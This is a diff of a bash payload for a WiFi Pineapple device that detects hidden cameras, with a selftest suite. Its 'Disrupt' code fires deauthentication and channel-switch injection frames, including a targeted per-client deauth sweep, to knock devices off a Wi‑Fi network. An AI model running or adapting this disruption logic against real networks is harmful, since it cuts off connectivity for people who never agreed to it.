       unlock_target                      # every refusal past the lock must release it, or a leaked
       log resp "unlocked after refusal"  # EXAMINE pins the radio off its hop cycle for the run
       if [ -n "$MEMBERS_WHY" ]; then
         why="$MEMBERS_WHY"; LOG red "$MEMBERS_TEXT"
-      elif (( ${#RESP_MEMBERS[@]} > 0 )); then
-        # Heard stations, but not one survived Recon and the randomised-MAC gate. Saying "no
-        # clients" here would be a lie about a BSS we demonstrably heard traffic on, and it would
-        # send the operator to look for a dead AP instead of at the gate that dropped them.
-        why=NO_MATCH
-        LOG red "heard ${#RESP_MEMBERS[@]} on ${R_BSSID:9} but none is measurable: no Recon row, or randomised"
       else
+        # Reachable only if a membership set was gathered for a DIFFERENT BSSID, which resp_fire's
+        # entry reset should prevent; kept as a guard rather than a claim about the air.
         why=NO_CLIENTS; LOG red "no visible clients on ${R_BSSID:9}: nothing to disconnect"
       fi
       log resp "refused $R_BSSID $why members=${#RESP_MEMBERS[@]} itmax=$BSS_ITMAX recs=$BSS_RECS short=$BSS_SHORT"
@@ -2451,11 +2889,92 @@ resp_fire() {   # resp_fire <mac> <attack key> <badge> -> 0 when a verdict was r
     (( ${#subjects[@]} == 0 )) && { subjects=("$R_TARGET"); P0[$R_TARGET]=-; T0[$R_TARGET]=-; }
   fi
   n=${#subjects[@]}
+  [ "$lock" = unverified ] && LOG yellow "$LOCK_TEXT"
   set_state RESPOND
   LOG "$k -> ${R_BSSID:9} ch $R_CH"$'\n'"lock: $lock, $n subject(s)"
-  log resp "fire $k $R_BSSID $R_TARGET ch$R_CH badge=$badge lock=$lock scope=$scope subjects=$n"
-  if [ "$k" = CSA ]; then "$cmd" "$R_BSSID" "$R_CH" >/dev/null 2>&1
-  else "$cmd" "$R_BSSID" "$R_TARGET" "$R_CH" >/dev/null 2>&1; fi
+  log resp "fire $k $R_BSSID $R_TARGET ch$R_CH badge=$badge lock=$lock scope=$scope subjects=$n measurable=$nmeas heard=${#RESP_MEMBERS[@]}"
+  # Capture the command's rc AND its stderr. Discarding both was a real defect: if the firmware
+  # refuses the command nothing leaves the radio, yet the loot row still read NO_EFFECT (subjects
+  # kept transmitting) or MOVED (a counter happened to stall) -- indistinguishable from a real
+  # measurement. NO_EFFECT in particular reads as the firmware fact "CSA does not move this
+  # camera", which is one of the open questions this rung exists to ANSWER (CLAUDE.md, day-one
+  # 17a). A swallowed refusal does not merely lose information, it files a fabricated answer.
+  # CMD_REFUSED is deliberately NOT in the MOVED/NO_EFFECT/INCONCLUSIVE vocabulary, so a refusal
+  # can never be mistaken for a measurement by a reader of responses.tsv.
+  if [ "$k" = CSA ]; then
+    # csa_issue owns the rc-vs-stderr question, which the two senders answer oppositely, and logs
+    # its own command line. It also names itself for the loot, so a reader can tell a pagerinj CSA
+    # from a firmware one without cross-referencing the config.
+    csa_issue; frc=$?; ferr="$CSA_ERR"; cmd="$CSA_CMD"
+    # rc 2 is "transmitted, then capped by its own timeout" -- frames provably left the radio, so
+    # this must not take the refusal path below. Let it through to the measurement, which scores it
+    # on the counters like any other fire; a capped injector is a reason to distrust the DWELL, not
+    # a reason to claim nothing was sent.
+    if (( frc == 2 )); then
+      LOG yellow "CSA injector was capped after transmitting; measuring anyway"
+      log resp "csa capped-after-send ${ferr:0:160}"
+      frc=0; ferr=''
+    fi
+  else
+    : >"$FIRE_ERR"
+    "$cmd" "$R_BSSID" "$R_TARGET" "$R_CH" >/dev/null 2>"$FIRE_ERR"
+    frc=$?; ferr=$(tr '\n' ' ' <"$FIRE_ERR" 2>/dev/null); ferr=${ferr:0:200}; rm -f "$FIRE_ERR"
+    log resp "cmd $cmd rc=$frc${ferr:+ err=$ferr}"
+  fi
+  if (( frc != 0 )) || [ -n "$ferr" ]; then
+    unlock_target; log resp "unlocked after refusal"
+    LOG red "$cmd refused (rc $frc): nothing was transmitted"${ferr:+$'\n'"$ferr"}
+    for m in "${subjects[@]}"; do resp_write "$mac" "$badge" "$k" "$cmd" "$lock" "${P0[$m]}" - CMD_REFUSED "$m"; done
+    set_state RESPOND_NIL; return 1
+  fi
+  # The CSA half of BOTH, issued as its own command because no firmware command combines them (see
+  # response_cmd: _ALL is the CSA opcode under another name, and pineapd's real deauth+CSA opcode
+  # 401 is dead code no command reaches). A refused CSA leg must NOT fail the attempt -- the deauth
+  # has already left -- so it warns and the loot records which legs went out.
+  if [ "$k" = BOTH ]; then
+    csa_issue; local crc=$?
+    # 0 sent cleanly, 2 sent then capped. Both put frames on the air, so both name the sender in
+    # the loot; only a real failure takes the warning branch.
+    if (( crc == 0 )) || (( crc == 2 )); then
+      (( crc == 2 )) && log resp "csa leg capped after sending ${CSA_ERR:0:160}"
+      # Keep the firmware spelling stable for readers and for the gates; name the injector when it
+      # is what actually sent, since "which CSA was this" is the first question a loot row raises.
+      case "$CSA_CMD" in PINEAPPLE_*) cmd="$cmd+CSA" ;; *) cmd="$cmd+$CSA_CMD" ;; esac
+    else
+      LOG yellow "CSA leg did not send; the deauth was still transmitted"
+      log resp "csa leg failed ${CSA_ERR:-unknown}"
+    fi
+  fi
+  # Targeted sweep. Measured on the bench 2026-11-05 against one phone on one AP: a TARGETED
+  # PINEAPPLE_DEAUTH_CLIENT dropped it immediately, while PINEAPPLE_DEAUTH_CLIENT_ALL and
+  # PINEAPPLE_DEAUTH_CLIENT_CSA were both accepted (rc 0) and did nothing. That is one data point
+  # from the hardest class of client - a modern phone with a randomised MAC - and it says nothing
+  # about what a cheap camera's stack does, so this ADDS a targeted frame per member rather than
+  # replacing the broadcast one. The two are complementary, not ordered: broadcast reaches members
+  # the capture never enumerated and is immune to a stale address, while targeted reaches members
+  # that filter broadcast. Doing both is better than either, and costs n frames instead of one.
+  # Not for CSA: that command takes no target (<bssid> <channel>, arity measured on the device).
+  # Guarded on SCOPE, not on R_TARGET being broadcast. attack_scope is the single place blast radius
+  # is decided, and a CLIENT row firing BOTH is scope=bss with R_TARGET set to the client - _ALL
+  # discards that target and goes BSS-wide regardless - so an R_TARGET test would skip the sweep in
+  # exactly the case it is most needed. Unreachable until the inverse lookup lands; wrong now.
+  if [ "$SWEEP_TARGETED" = 1 ] && [ "$k" != CSA ] && [ "$scope" = bss ] && (( n > 0 )); then
+    local sw_cmd sw_ok=0 sw_rc sw_err
+    sw_cmd=$(response_cmd DEAUTH)
+    if [ -n "$sw_cmd" ] && command -v "$sw_cmd" >/dev/null 2>&1; then
+      for m in "${subjects[@]}"; do
+        : >"$FIRE_ERR"
+        "$sw_cmd" "$R_BSSID" "$m" "$R_CH" >/dev/null 2>"$FIRE_ERR"; sw_rc=$?
+        sw_err=$(tr '\n' ' ' <"$FIRE_ERR" 2>/dev/null); rm -f "$FIRE_ERR"
+        # rc is useless on this firmware (hak5cmd exits 0 on its error paths too, measured), so the
+        # stderr is the only signal that a frame was refused.
+        if (( sw_rc == 0 )) && [ -z "$sw_err" ]; then sw_ok=$((sw_ok + 1))
+        else log resp "sweep $m rc=$sw_rc${sw_err:+ err=${sw_err:0:120}}"; fi
+      done
+      log resp "sweep $sw_cmd $R_BSSID targeted=$sw_ok of $n"
+      (( sw_ok > 0 )) && LOG "targeted $sw_ok/$n client(s)"
+    fi
+  fi
   sleep "$RESP_SETTLE_SECS"
   resp_snapshot "$scope"
   unlock_target
@@ -2497,6 +3016,14 @@ auto_respond_ok() {
 
 disrupt_row() {   # a cached badge is free to show; an uncached one is not worth a capture to render
   local mac="$1" ap bss
+  # Mirrors "Watch n/a (not associated)" two lines up in detail_card. Without this the operator
+  # presses Disrupt, resp_target refuses, the red line lands on the log pane BEHIND the card, and
+  # the card redraws unchanged - which reads as a dead button. Safe to call resp_target here:
+  # disrupt_row always runs inside $( ), so the globals it sets die with the subshell.
+  if [ "${ROLE[$mac]}" = cli ] && { [ -z "${AP_OF[$mac]}" ] || [ "${AP_OF[$mac]}" = - ]; }; then
+    printf 'Disrupt n/a (not associated)'; return 0     # no BSS to announce from
+  fi
+  resp_target "$mac" || { printf 'Disrupt n/a (no channel)'; return 0; }
   [ "${ROLE[$mac]}" = cli ] && bss="${AP_OF[$mac]:--}" || bss="$mac"
   if [ -n "${POSTURE[$bss]}" ] && (( EPOCHSECONDS - ${POSTURE_TS[$bss]:-0} < POSTURE_TTL )); then
     printf 'Disrupt [%s]' "${POSTURE[$bss]}"
@@ -2610,16 +3137,46 @@ write_report() {
 # =============================================================================== selftest ===
 ST_FAIL=0; ST_N=0
 st() { ST_N=$((ST_N + 1)); if [ "$2" = "$3" ]; then printf 'ok   %s\n' "$1"; else printf 'FAIL %s: got [%s] want [%s]\n' "$1" "$2" "$3"; ST_FAIL=$((ST_FAIL + 1)); fi; }
-st_stub_ui() {   # laptop run: UI commands stubbed when absent; everything that would change the device or its saved config stubbed even when present, so --selftest is safe on a Pager
-  for c in LOG LED VIBRATE RINGTONE ALERT PROMPT ERROR_DIALOG; do command -v "$c" >/dev/null 2>&1 || eval "$c() { :; }"; done
-  for c in _pineap PINEAPPLE_EXAMINE_BSSID PINEAPPLE_EXAMINE_CHANNEL PINEAPPLE_EXAMINE_RESET PINEAPPLE_RECON_NEW PINEAPPLE_SET_BANDS \
-           PINEAPPLE_DEAUTH_CLIENT PINEAPPLE_DEAUTH_CLIENT_ALL PINEAPPLE_DEAUTH_CLIENT_CSA PAYLOAD_SET_CONFIG PAYLOAD_DEL_CONFIG; do eval "$c() { :; }"; done
+st_stub_ui() {   # --selftest must change nothing, say nothing, and never block - on a laptop or on a Pager
+  local c
+  # Display and physical effects. Stubbed EVEN WHEN PRESENT: they used to be stubbed only when
+  # absent, which is true of a laptop and false of a Pager, so on the device the selftest painted
+  # the operator's screen with its own fixtures - "settings reset to defaults", "band write
+  # restarted pineapd: Recon starts over", "sig line 0 skipped: bad label", "RSSI_MIN 60 ignored".
+  # Every one of those is a false statement about the device, on the same display a live payload is
+  # using. No case asserts on them, because the laptop they were written for stubs them away.
+  ST_QUIET=(LOG LED VIBRATE RINGTONE ALERT PROMPT ERROR_DIALOG)
+  # Anything that waits for a button press, stubbed to DECLINE. rc != 0 is the cancel path in all
+  # three callers (confirm, pick_list, settings_menu's number branch), and it is also what the
+  # laptop does today by accident: absent -> 127. These were stubbed NOWHERE, and that asymmetry is
+  # the trap - absent where the gates run, present on the Pager - so a future case reaching
+  # settings_menu, pick_list, disrupt_menu or resp_fire would pass every gate and then block a
+  # device run for ever, waiting for a press nobody is there to make.
+  ST_BLOCKING=(CONFIRMATION_DIALOG LIST_PICKER NUMBER_PICKER)
+  # Anything that changes the device or its saved config.
+  ST_DEVICE=(_pineap PINEAPPLE_EXAMINE_BSSID PINEAPPLE_EXAMINE_CHANNEL PINEAPPLE_EXAMINE_RESET PINEAPPLE_RECON_NEW PINEAPPLE_SET_BANDS
+             PINEAPPLE_DEAUTH_CLIENT PINEAPPLE_DEAUTH_CLIENT_ALL PINEAPPLE_DEAUTH_CLIENT_CSA PAYLOAD_SET_CONFIG PAYLOAD_DEL_CONFIG)
+  for c in "${ST_QUIET[@]}" "${ST_DEVICE[@]}"; do eval "$c() { :; }"; done
+  for c in "${ST_BLOCKING[@]}"; do eval "$c() { return 1; }"; done
   PAYLOAD_GET_CONFIG() { return 1; }
+  ST_STUBBED=("${ST_QUIET[@]}" "${ST_BLOCKING[@]}" "${ST_DEVICE[@]}" PAYLOAD_GET_CONFIG)
+  # Not coverable here: GPS_GET runs as `timeout 3 GPS_GET`, and timeout execs a real command, so a
+  # shell function never intercepts it. That timeout is its only bound.
+}
+st_stubs_intact() {   # -> the stubs a teardown destroyed, or "none". A teardown that unset -f's one
+  local c miss=""   # of these hands every later case the REAL command, which on a Pager is a radio.
+  for c in "${ST_STUBBED[@]}"; do [ "$(type -t "$c")" = function ] || miss+=" $c"; done
+  printf '%s' "${miss:-none}"
 }
 st_device() {   # st_device mac role "vendor text" "ssid" hidden ap_of
   local m="$1"
   ROLE[$m]="$2"; VLOW[$m]="${3,,}"; VENDOR[$m]="${3:0:14}"; unset "VEND_TYPE[$m]"; SSID_CLEAN[$m]="$4"; HIDDEN[$m]="$5"; AP_OF[$m]="${6:--}"
   LAST_SEEN[$m]=$EPOCHSECONDS; N_SEEN[$m]=1; FIRST_SEEN[$m]=$EPOCHSECONDS; KITAP[$m]=""; unset "KITCL[$m]" "BEH[$m]" "BEH_GATE[$m]" "BEH_VERDICT[$m]" "EVENT_FLAG[$m]" "BUSY[$m]" "PROBES[$m]"
+}
+st_other_has() {   # st_other_has mac -> yes|no: is this MAC in the "Other devices" list?
+  sort_macs other; local m
+  for m in "${SORTED[@]}"; do [ "$m" = "$1" ] && { printf yes; return 0; }; done
+  printf no
 }
 st_pcap() {   # synthetic LE pcap: st_pcap file orig_len count ts
   local f="$1" ol="$2" n="$3" ts="$4" i
@@ -2706,6 +3263,7 @@ selftest() {
   local tmp="${TMPDIR:-/tmp}/cs_st.$$" f lbl n ssid
   st_stub_ui; mkdir -p "$tmp"; LOOT_DIR="$tmp"; RUN_ID="selftest"
   printf '== CamHound %s selftest ==\n' "$VERSION"
+  st "stubs: every device and UI command is stubbed before the first case" "$(st_stubs_intact)" "none"
   # 1 signatures
   if f=$(find_install_dir); then load_signatures "$f/cam_signatures.txt"; SIG_SOURCE="file"; else load_signatures <(builtin_signatures); fi
   st "signatures loaded ($SIG_SOURCE, $SIG_COUNT rows)" "$(( SIG_COUNT > 20 ))" 1
@@ -2718,6 +3276,58 @@ selftest() {
   printf 'EC71DB\tReolink Innovation Limited\n' >"$tmp/oui2.txt"; printf 'EC:71:DB\t(hex)\tReolink Innovation Limited\n' >"$tmp/oui3.txt"
   OUI_FILE="$tmp/oui2.txt"; vendor_of "ec:71:db:00:00:01"; st "oui.txt 2-column lookup" "${VLOW[ec:71:db:00:00:01]}" "reolink innovation limited"
   OUI_FILE="$tmp/oui3.txt"; vendor_of "ec:71:db:00:00:02"; st "oui.txt 3-column lookup" "${VLOW[ec:71:db:00:00:02]}" "reolink innovation limited"
+  # 2a vendor_prefetch: one table pass must agree with the per-MAC grep it replaces, on every shape
+  # the grep accepts. Each fixture below is a case an earlier prototype got WRONG, so these are
+  # regression rows, not decoration.
+  printf 'EC71DB0\tReolink Innovation Limited\n'            >"$tmp/ouiP.txt"   # longer first field: grep ^EC71DB prefix-matches
+  printf 'eC71dB\tReolink Innovation Limited\n'             >"$tmp/ouiC.txt"   # mixed case: grep -i matches per character
+  printf 'EC-71-DB\t(hex)\t\tReolink Innovation Limited\n' >"$tmp/ouiT.txt"  # canonical IEEE: double tab, bash collapses it
+  printf 'EC:71:DB\tEC-71-DB\tReolink Innovation Limited\n' >"$tmp/ouiH.txt"  # hex-looking 2nd column, not literal (hex)
+  local _lay _m=0 _n=""
+  for _lay in oui2 oui3 ouiP ouiC ouiT ouiH; do
+    OUI_FILE="$tmp/$_lay.txt"
+    unset "VLOW[aa:00:00:00:10:01]" "VENDOR[aa:00:00:00:10:01]" "VLOW[ec:71:db:00:10:02]" "VENDOR[ec:71:db:00:10:02]"
+    vendor_of "ec:71:db:00:10:02"                       # the grep path
+    vendor_prefetch "ec:71:db:00:10:01"                 # the one-pass path, same key
+    [ "${VLOW[ec:71:db:00:10:01]}" = "${VLOW[ec:71:db:00:10:02]}" ] || { _m=$((_m + 1)); _n="$_lay:[${VLOW[ec:71:db:00:10:01]}]vs[${VLOW[ec:71:db:00:10:02]}]"; }
+    unset "VLOW[ec:71:db:00:10:01]" "VENDOR[ec:71:db:00:10:01]" "VLOW[ec:71:db:00:10:02]" "VENDOR[ec:71:db:00:10:02]"
+  done
+  st "oui batch: one pass agrees with the per-MAC grep on all six layouts" "$_m${_n:+ $_n}" "0"
+  OUI_FILE="$tmp/oui2.txt"
+  printf 'EC71DB\tFIRST\nEC71DB\tSECOND\n' >"$tmp/ouiD.txt"; OUI_FILE="$tmp/ouiD.txt"
+  unset "VLOW[ec:71:db:00:10:03]"; vendor_prefetch "ec:71:db:00:10:03"
+  st "oui batch: a duplicated OUI keeps the FIRST row, as grep -m1 does" "${VLOW[ec:71:db:00:10:03]}" "first"
+  OUI_FILE="$tmp/oui2.txt"
+  # A miss must be CACHED, or the batch optimises only the hits and every miss still pays a grep -
+  # and the miss is the expensive case: 5.05 s on the device against ~2.5 s for an average hit.
+  unset "VLOW[00:11:22:00:10:04]"; vendor_prefetch "00:11:22:00:10:04"
+  st "oui batch: a miss is cached, not left to fall through to the grep" "${VLOW[00:11:22:00:10:04]+set}:[${VLOW[00:11:22:00:10:04]}]" "set:[]"
+  # The randomised skip must sit AFTER the cache guard: before it, st_device's injected vendors are
+  # overwritten and the scoring cases fail. This asserts both halves.
+  unset "VLOW[4e:42:dc:3b:d1:33]" "VENDOR[4e:42:dc:3b:d1:33]"
+  vendor_of "4e:42:dc:3b:d1:33"
+  st "vendor: a randomised MAC skips the table and caches the skip" "${VLOW[4e:42:dc:3b:d1:33]+set}:[${VLOW[4e:42:dc:3b:d1:33]}]:${VENDOR[4e:42:dc:3b:d1:33]}" "set:[]:-"
+  VLOW[4e:42:dc:3b:d1:34]="injected vendor"; VENDOR[4e:42:dc:3b:d1:34]="injected"
+  vendor_of "4e:42:dc:3b:d1:34"
+  st "vendor: the skip is after the cache guard, so an injected vendor survives" "${VLOW[4e:42:dc:3b:d1:34]}" "injected vendor"
+  # THE STRUCTURAL GATE. Every gate runs on a fast x86 host with GNU grep and a 2-line fixture, so no
+  # timing assertion here can ever catch a per-device file scan. Count the table reads instead: N
+  # devices must cost ONE pass, not N. Without this, a regression to per-MAC grep is invisible.
+  local _gn=0
+  grep() { _gn=$((_gn + 1)); command grep "$@"; }
+  local _d; for _d in 01 02 03 04 05 06 07 08 09 10; do unset "VLOW[ec:71:db:00:20:$_d]"; done
+  vendor_prefetch ec:71:db:00:20:01 ec:71:db:00:20:02 ec:71:db:00:20:03 ec:71:db:00:20:04 ec:71:db:00:20:05 \
+                  ec:71:db:00:20:06 ec:71:db:00:20:07 ec:71:db:00:20:08 ec:71:db:00:20:09 ec:71:db:00:20:10
+  st "oui batch: 10 devices cost 0 greps, not 10" "$_gn" "0"
+  for _d in 01 02 03 04 05 06 07 08 09 10; do vendor_of "ec:71:db:00:20:$_d"; done
+  st "oui batch: and the prefetch leaves nothing for vendor_of to grep" "$_gn" "0"
+  unset -f grep
+  for _d in 01 02 03 04 05 06 07 08 09 10; do unset "VLOW[ec:71:db:00:20:$_d]" "VENDOR[ec:71:db:00:20:$_d]"; done
+  # band_of / band_rank set globals now; a $( ) at either call site is a fork per device per cycle.
+  band_of 2437; local _b2=$BAND_V; band_of 5180; local _b5=$BAND_V; band_of 6135; local _b6=$BAND_V; band_of 100; local _bq=$BAND_V
+  st "band_of sets BAND_V across all four bands" "$_b2 $_b5 $_b6 $_bq" "2 5 6 ?"
+  band_rank CONFIRMED; local _r3=$RANK_V; band_rank LIKELY; local _r2=$RANK_V; band_rank POSSIBLE; local _r1=$RANK_V; band_rank MODULE; local _r0=$RANK_V
+  st "band_rank sets RANK_V" "$_r3 $_r2 $_r1 $_r0" "3 2 1 0"
   # 3 delimiters
   st "clean_text strips | ; and non-printables" "$(clean_text $'Cam|1;2\x01x')" "Cam_1_2x"
   # 4 scoring worked examples (section 5.1 of the plan)
@@ -2768,13 +3378,45 @@ selftest() {
   st "hidden LAA AP + 3 Realtek clients = KIT?" "${KITAP[02:11:22:00:00:01]} ${TAGS[02:11:22:00:00:01]}" "? KIT?"
   st_device aa:00:00:00:00:05 ap "Hangzhou Hikvision Digital Technology" "" 1; score_device aa:00:00:00:00:05
   st "hidden Hikvision AP = 55 LIKELY HIDDEN" "${CONF[aa:00:00:00:00:05]} ${BANDNAME[aa:00:00:00:00:05]} ${TAGS[aa:00:00:00:00:05]}" "55 LIKELY HIK-OUI HIDDEN"
+  # 4b "Other devices": the complement of the two existing lists. Every row below is a device one
+  # of them drops, and the AP cases are the gap this list was added for - before it, an AP that no
+  # signature named appeared in NO list and so could not be Watched at all.
+  local _oap=cc:00:00:00:00:01 _osc=cc:00:00:00:00:02 _omc=cc:00:00:00:00:03
+  local _oma=cc:00:00:00:00:04 _ofa=cc:00:00:00:00:05 _ocl=cc:00:00:00:00:06 _ost=cc:00:00:00:00:07
+  st_device $_oap ap "Shenzhen Nobody Ltd" "bebird-R1-038686" 0; RSSI_HIST[$_oap]="-26"; BAND[$_oap]=2; score_device $_oap
+  st "other: an unscored AP under an unknown SSID is reachable at last" "$(st_other_has $_oap)" "yes"
+  st_device $_osc ap "Hangzhou Hikvision Digital Technology" "EZVIZ_ABCDEF123" 0; RSSI_HIST[$_osc]="-30"; BAND[$_osc]=2; score_device $_osc
+  st "other: a scored AP stays in Review hits and is not duplicated here" "$(st_other_has $_osc)" "no"
+  st_device $_omc cli "Espressif Inc" "" 0 aa:00:00:00:00:99; RSSI_HIST[$_omc]="-30"; BAND[$_omc]=2; score_device $_omc
+  st "other: a module CLIENT stays in the modules list" "$(st_other_has $_omc)" "no"
+  st_device $_oma ap "Espressif Inc" "" 0; RSSI_HIST[$_oma]="-30"; BAND[$_oma]=2; score_device $_oma
+  st "other: a module AP appears here, because the modules list refuses APs" "$(st_other_has $_oma)" "yes"
+  st_device $_ofa ap "Shenzhen Nobody Ltd" "far-ap" 0; RSSI_HIST[$_ofa]="-95"; BAND[$_ofa]=2; score_device $_ofa
+  st "other: a device past FAR_DBM is gated out, so the list is the room" "$(st_other_has $_ofa)" "no"
+  st_device $_ocl cli "Some Laptop Vendor" "" 0 -; RSSI_HIST[$_ocl]="-40"; BAND[$_ocl]=2; score_device $_ocl
+  st "other: an unscored non-module client is here too" "$(st_other_has $_ocl)" "yes"
+  st_device $_ost ap "Shenzhen Nobody Ltd" "streamer-ap" 0; RSSI_HIST[$_ost]="-35"; BAND[$_ost]=2; score_device $_ost
+  st "other: before Watch, a silent unknown AP is listed" "$(st_other_has $_ost)" "yes"
+  BEH[$_ost]=55; BEH_GATE[$_ost]=55; BEH_VERDICT[$_ost]=STREAM; score_device $_ost
+  # The drain property: Watch it, find it streaming, and it scores its way into Review hits. If this
+  # ever fails the list accumulates instead of emptying as the operator works through it.
+  st "other: Watched into STREAM, it promotes into Review hits and leaves this list" "$(st_other_has $_ost)" "no"
+  unset "RSSI_HIST[$_oap]" "RSSI_HIST[$_osc]" "RSSI_HIST[$_omc]" "RSSI_HIST[$_oma]" "RSSI_HIST[$_ofa]" "RSSI_HIST[$_ocl]" "RSSI_HIST[$_ost]"
+  unset "CONF[$_oap]" "CONF[$_osc]" "CONF[$_omc]" "CONF[$_oma]" "CONF[$_ofa]" "CONF[$_ocl]" "CONF[$_ost]"
+  unset "BEH[$_ost]" "BEH_GATE[$_ost]" "BEH_VERDICT[$_ost]"
+  # The filter above is well covered; the WIRING is not, and a typo in either string would make the
+  # entry unreachable with every other test still green. Same technique as the SETTINGS_TABLE check.
+  local _me _mc
+  _me=$(sed -n 's/.*menu+=("\(Other devices\)").*/\1/p' "${BASH_SOURCE[0]}" | head -1)
+  _mc=$(sed -n 's/.*"\(Other devices\)") other_list.*/\1/p' "${BASH_SOURCE[0]}" | head -1)
+  st "other: the menu entry and its dispatch label are the same string" "[$_me][$_mc]" "[Other devices][Other devices]"
   # 5 proximity
   RSSI_HIST[aa:00:00:00:00:01]="-70 -58 -65"; BAND[aa:00:00:00:00:01]=2; MODE=ROOM; apply_mode; prox_of aa:00:00:00:00:01; st "prox ROOM -58 best = N" "${PROX[aa:00:00:00:00:01]}" N
   RSSI_HIST[aa:00:00:00:00:01]="-79"; prox_of aa:00:00:00:00:01; st "prox ROOM -79 = F" "${PROX[aa:00:00:00:00:01]}" F
   MODE=SITE; apply_mode; prox_of aa:00:00:00:00:01; st "prox SITE -79 = M" "${PROX[aa:00:00:00:00:01]}" M; MODE=ROOM; apply_mode
   # 6 rows / status / inventory
   RSSI_LAST[aa:00:00:00:00:01]=-58; PROX[aa:00:00:00:00:01]=N; row_for aa:00:00:00:00:01; st "row fits ROW_W" "$(( ${#ROW} <= ROW_W ))" 1
-  st "row text" "$ROW" "90 HIK-OUI NA-58"
+  st "row text: role glyph leads, so the column is scannable" "$ROW" "A 90 HIK-OUI N-58"
   n=$(inv_row aa:00:00:00:00:01 | awk -F'|' '{print NF}'); st "inventory row field count = header" "$n" "$(printf '%s\n' "$INV_HDR" | awk -F'|' '{print NF}')"
   # 7 pcap parser
   st_pcap "$tmp/t.pcap" 1200 20 1700000000; st "pcap buckets (10 s x 2 big frames)" "$(pcap_buckets "$tmp/t.pcap" | wc -l | tr -d ' ')" 10
@@ -2898,13 +3540,91 @@ IWFIX
   # three operator-selectable attacks: command mapping, viability, honest per-option labels
   st "cmd DEAUTH"  "$(response_cmd DEAUTH)" "PINEAPPLE_DEAUTH_CLIENT"
   st "cmd CSA"     "$(response_cmd CSA)"    "PINEAPPLE_DEAUTH_CLIENT_CSA"
-  st "cmd BOTH"    "$(response_cmd BOTH)"   "PINEAPPLE_DEAUTH_CLIENT_ALL"
+  # BOTH maps to the opcode-400 deauth; resp_fire adds the CSA as a second command. _ALL is NOT
+  # used: it carries the CSA command id and builds no deauth frame (CLAUDE.md "Third contact").
+  st "cmd BOTH is the deauth, not _ALL" "$(response_cmd BOTH)" "PINEAPPLE_DEAUTH_CLIENT"
+  # ---- CSA injector routing ----------------------------------------------------------------
+  # csa_newchan must never announce the channel the target is already on: that announces no move,
+  # the kernel discards it before reading the count under mode 0, and pagerinj refuses it outright.
+  R_BAND=2; R_CH=8;   CSA_CHAN=0; st "csa chan: 2.4 high picks 1"      "$(csa_newchan)" "1"
+  R_BAND=2; R_CH=3;   CSA_CHAN=0; st "csa chan: 2.4 low picks 11"      "$(csa_newchan)" "11"
+  R_BAND=5; R_CH=36;  CSA_CHAN=0; st "csa chan: 5 GHz avoids its own"  "$(csa_newchan)" "40"
+  R_BAND=5; R_CH=149; CSA_CHAN=0; st "csa chan: 5 GHz default"         "$(csa_newchan)" "36"
+  R_BAND='?'; R_CH=8; CSA_CHAN=0; st "csa chan: unknown band will not guess" "$(csa_newchan)" ""
+  R_BAND=2; R_CH=8;   CSA_CHAN=6; st "csa chan: explicit override wins" "$(csa_newchan)" "6"
+  CSA_CHAN=0
+  # Routing, and the rc-vs-stderr asymmetry that makes it worth testing: pagerinj prints its
+  # sent=/failed= summary to stderr even when it succeeds, so stderr cannot mean failure for it,
+  # while hak5cmd exits 0 on every error path so rc cannot mean success for that. A single rule
+  # would file a fabricated result for one of the two senders.
+  R_BSSID=aa:00:00:00:00:10; R_CH=8; R_BAND=2; RECON_IF=wlan1mon; CSA_COUNT=3
+  printf '#!/bin/sh\nprintf "sent=30 failed=0\\n" >&2\nprintf "%%s\\n" "$*" >"%s/injargs"\nexit 0\n' "$tmp" >"$tmp/inj_ok"
+  printf '#!/bin/sh\nprintf "no beacon captured\\n" >&2\nexit 1\n' >"$tmp/inj_bad"
+  chmod +x "$tmp/inj_ok" "$tmp/inj_bad"
+  CSA_INJECTOR="$tmp/inj_ok"; csa_issue
+  st "csa issue: a working injector succeeds despite writing to stderr" "$?" 0
+  st "csa issue: it was called with iface, bssid, a DIFFERENT channel and the count" \
+    "$(grep -c -- '\-i wlan1mon --csa --bssid aa:00:00:00:00:10 --chan 1 --count 3' "$tmp/injargs")" "1"
+  st "csa issue: the loot names the injector and its parameters" "$CSA_CMD" "inj_ok:ch1:n3"
+  CSA_INJECTOR="$tmp/inj_bad"; csa_issue
+  st "csa issue: a non-zero injector rc is a failure"            "$?" 1
+  st "csa issue: and the reason is carried to the caller" \
+    "$(printf '%s' "$CSA_ERR" | grep -c 'no beacon captured')" "1"
+  # A CAPPED injector transmitted and was then killed by its own timeout, so rc is timeout's (124)
+  # and not pagerinj's. Scoring that as a refusal writes CMD_REFUSED -- "nothing was transmitted" --
+  # for frames that provably left the radio, which the harness calls a lie in as many words. rc 2 is
+  # the third state. Falsified by: csa_issue returning 1 for a run whose stderr reports sent=N, N>0.
+  printf '#!/bin/sh\nprintf "interrupted: sent=90 failed=0\\n" >&2\nexit 124\n' >"$tmp/inj_capped"
+  printf '#!/bin/sh\nprintf "interrupted: sent=5 failed=0\\n" >&2\nexit 7\n' >"$tmp/inj_sent7"
+  chmod +x "$tmp/inj_capped" "$tmp/inj_sent7"
+  # -k is a syntax dependency this payload cannot verify against the Pager's busybox, so csa_issue
+  # has to fall back rather than fail. Stub a timeout that rejects -k the way an older build would.
+  timeout() { case "$1" in -k) return 1 ;; esac; shift; "$@"; }
+  TIMEOUT_K_PROBED=0; TIMEOUT_K=()
+  CSA_INJECTOR="$tmp/inj_ok"; csa_issue
+  st "csa issue: a timeout that rejects -k still runs the injector" "$?" 0
+  st "csa issue: and it ran with no -k in the argv"  "$(grep -c -- '-k' "$tmp/injargs")" "0"
+  unset -f timeout; TIMEOUT_K_PROBED=0; TIMEOUT_K=()
+  CSA_INJECTOR="$tmp/inj_capped"; csa_issue >/dev/null 2>&1
+  st "csa issue: a capped injector is rc 2 (sent, then killed), not a refusal" "$?" 2
+  st "csa issue: and the reason says it transmitted first" \
+    "$(printf '%s' "$CSA_ERR" | grep -c 'capped after transmitting')" "1"
+  CSA_INJECTOR="$tmp/inj_sent7"; csa_issue >/dev/null 2>&1
+  st "csa issue: any rc whose stderr reports sent=N>0 is rc 2, not a refusal" "$?" 2
+  CSA_INJECTOR="$tmp/not_installed"; csa_issue >/dev/null 2>&1
+  st "csa issue: an absent injector falls back to the firmware command" "$CSA_CMD" "PINEAPPLE_DEAUTH_CLIENT_CSA"
+  st "csa issue: a successful injector leaves no error behind" \
+    "$( CSA_INJECTOR="$tmp/inj_ok"; csa_issue && printf '[%s]' "$CSA_ERR" )" "[]"
+  # The two senders answer the rc-vs-stderr question OPPOSITELY and csa_issue has to get both right.
+  # hak5cmd exits 0 on EVERY path including its error paths and writes the reason to stderr
